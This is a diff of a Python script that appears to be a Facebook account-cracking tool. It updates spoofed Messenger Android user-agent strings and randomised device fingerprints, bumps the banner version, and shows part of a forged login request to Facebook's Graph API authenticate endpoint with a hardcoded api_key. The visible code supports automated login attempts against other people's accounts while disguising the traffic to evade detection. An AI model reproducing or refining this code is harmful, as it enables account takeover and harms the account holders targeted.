@@ -86,7 +86,7 @@ except: pass
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/Orca-Android;FBAV/78.0.0.3184;FBBV/446409108;FBDM/{density=2.0,width=720,height=1426};FBLC/pt_BR;FBRV/544912115;FBCR/Airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH2059;FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]'
+    END = '[FBAN/Orca-Android;FBAV/255.0.0.5572;FBBV/844902734;FBDM/{density=2.0,width=720,height=1426};FBLC/en_GB;FBRV/514766662;FBCR/Ufone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH2059;FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
@@ -118,18 +118,14 @@ logo =                                          """
   `Y8b. 88~~~88 88`8b   88    88     88         \033[0;35m
 db   8D 88   88 88 `88. `8b  d8' db. 88         \033[1;34m
 `8888Y' YP   YP 88   YD  `Y88P'  Y8888P          \033[0;34m
-                                         
-                                  
-
-   
-                                                                      
+                                                                                                              
 \033[1;32m×××××××××××××××××××××××××××××××××××××××××××××××
 \033[1;33m MAKER     >    \033[1;36msaroj
 \033[1;34m GITHUB    >    \033[1;33msaroj
 \033[1;35m TOOL'S    >    \033[1;31mPERSONAL
 \033[1;36m STATU'S   >    \033[1;32mACTIVE
 \033[1;35m×××××××××××××××××××××××××××××××××××××××××××××××    \033[1;35m
-\33[37;41m\t VERSION > V1 \33[0;m
+\33[37;41m\t VERSION > V1.4 \33[0;m
 \33[1;33m×××××××××××××××××××××××××××××××××××××××××××××××      \033[1;33m"""
 #××××××××××(CLEAR)××××××××××#
 def clear():
@@ -245,7 +241,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/78.0.0.3184;FBBV/446409108;FBDM/{density=2.0,width=720,height=1426};FBLC/pt_BR;FBRV/544912115;FBCR/Airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH2059;FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]',
+                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/255.0.0.5572;FBBV/844902734;FBDM/{density=2.0,width=720,height=1426};FBLC/en_GB;FBRV/514766662;FBCR/Ufone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH2059;FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]',
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
